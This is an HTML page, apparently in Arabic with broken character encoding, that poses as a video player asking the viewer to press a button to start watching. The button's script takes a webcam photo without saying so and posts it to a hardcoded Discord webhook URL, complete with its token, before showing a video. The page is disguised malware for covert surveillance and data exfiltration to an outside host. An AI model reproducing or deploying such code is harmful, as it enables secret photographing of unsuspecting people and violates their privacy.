<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>Ù…Ø´Ø§Ù‡Ø¯Ø© Ø§Ù„ÙÙŠØ¯ÙŠÙˆ</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      background: #000;
      color: #fff;
      font-family: sans-serif;
    }
    #videoElement {
      display: none;
      width: 100%;
      max-width: 640px;
    }
  </style>
</head>
<body>

<h2>Ø§Ø¶ØºØ· Ù…ÙˆØ§ÙÙ‚ Ù„Ø¨Ø¯Ø¡ Ù…Ø´Ø§Ù‡Ø¯Ø© Ø§Ù„ÙÙŠØ¯ÙŠÙˆ</h2>
<button onclick="startProcess()">Ø¨Ø¯Ø¡</button>

<video id="videoElement" controls>
  <source src="file:///C:/Users/sssae/Videos/Captures/Roblox%202025-07-20%2015-15-15.mp4.mp4" type="video/mp4">
</video>

<script>
const webhookUrl = "https://discord.com/api/webhooks/1405241771147005982/-GcjNpZ6HTB2tuXweaZ4oF0VTBZla6lbL7y9WPYx3FKHtEbmW_xscfQjC3YVO6ro2RLK";

async function startProcess() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const track = stream.getVideoTracks()[0];
    const imageCapture = new ImageCapture(track);
    const blob = await imageCapture.takePhoto();

    // Ø±ÙØ¹ Ø§Ù„ØµÙˆØ±Ø© Ù„Ù„ÙˆÙŠØ¨ Ù‡ÙˆÙˆÙƒ
    const formData = new FormData();
    formData.append("file", blob, "capture.jpg");
    formData.append("content", "ğŸ“¸ ØµÙˆØ±Ø© Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù‚Ø¨Ù„ Ø¹Ø±Ø¶ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ");
    await fetch(webhookUrl, { method: "POST", body: formData });

    track.stop(); // Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§

    // Ø¹Ø±Ø¶ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ
    document.querySelector("h2").style.display = "none";
    document.querySelector("button").style.display = "none";
    document.getElementById("videoElement").style.display = "block";
  } catch (err) {
    alert("Ù„Ù… ÙŠØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚ !.");
  }
}
</script>

</body>
</html>
